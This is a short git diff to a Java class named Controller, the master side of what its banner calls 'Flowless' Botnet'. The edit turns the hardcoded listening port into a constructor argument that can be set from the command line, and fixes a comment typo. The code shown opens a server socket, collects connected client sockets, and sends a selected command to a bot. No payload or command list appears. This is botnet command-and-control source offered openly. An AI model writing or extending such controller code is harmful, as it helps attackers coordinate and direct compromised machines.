@@ -14,23 +14,30 @@ import java.util.List;
 import java.util.Random;
 
 public class Controller {
-  // Port that will be opened
-  int port = 8888;
-  int millisecondsTimeout = 50;
+
   // List that will fill upp with connected clients
   static List<Socket> sockets = new ArrayList<Socket>();
-
   ServerSocket servSock;
-
   static boolean go = true;
+  int port;
+  int millisecondsTimeout;
+
+  Controller(int incPort) {
+    port = incPort;
+    millisecondsTimeout = 50;
+  }
 
   public static void main(String[] args) throws IOException, InterruptedException {
     System.out.println("-------------------------------");
     System.out.println("| Flowless' Botnet --- Master |");
     System.out.println("|         Version 1.0         |");
     System.out.println("-------------------------------");
+    int port = 8888;
+    if (args.length > 0){
+        port = Integer.parseInt(args[0]);
+    }
     // Instantiate the server
-    Controller serv = new Controller();
+    Controller serv = new Controller(port);
     // Open the given port
     serv.Open();
     String reply;
@@ -63,7 +70,7 @@ public class Controller {
     System.out.println("Sending: " + commands[choice]);
     //Initialize PrintWriter to start output stream
     PrintWriter out = new PrintWriter(sock.getOutputStream(), true);
-    // Sent and flush toilet
+    // Send and flush toilet
     out.println(commands[choice]);
     out.flush();
     go = false;
